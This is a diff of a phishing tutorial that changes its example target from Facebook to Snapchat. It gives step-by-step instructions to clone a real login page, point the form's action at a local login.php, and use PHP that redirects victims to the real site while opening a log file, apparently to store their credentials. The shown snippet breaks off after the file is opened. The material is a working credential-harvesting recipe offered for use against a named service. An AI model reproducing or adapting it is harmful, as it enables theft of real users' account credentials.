@@ -8,13 +8,13 @@ What we are going to do now.Normally in phishing we will just create a login pag
 StepS to Reproduce:
 
 1. First go to the desired website Login page for which you want to create Phishing page
-lets take www.facebook.com
+lets take www.snapchat.com
 
 2. Right click on the website and choose “page source” . Now you can see the whole script of the website.
 
 3. Copy the whole script and paste it into a text file. Press Control+F and type ” action “.
-Here in the case of “www.facebook.com “. The script line that has “action” looks something like this.
-action=”https://www.facebook.com/login.php?login_attempt=1“. Now replace everything inside the quotes with 
+Here in the case of “www.snapchat.com “. The script line that has “action” looks something like this.
+action=”https://www.snapchat.com/login.php?login_attempt=1“. Now replace everything inside the quotes with 
 ” login.php”. 
 
 So it will look like action=”login.php“ 
@@ -23,7 +23,7 @@ So it will look like action=”login.php“
 
 5. Now open a new text file and paste the following code
 
-header (‘Location: http://facebook.com ‘);
+header (‘Location: http://snapchat.com ‘);
 
 $handle = fopen(“logs_86354.txt”, “a”);
 
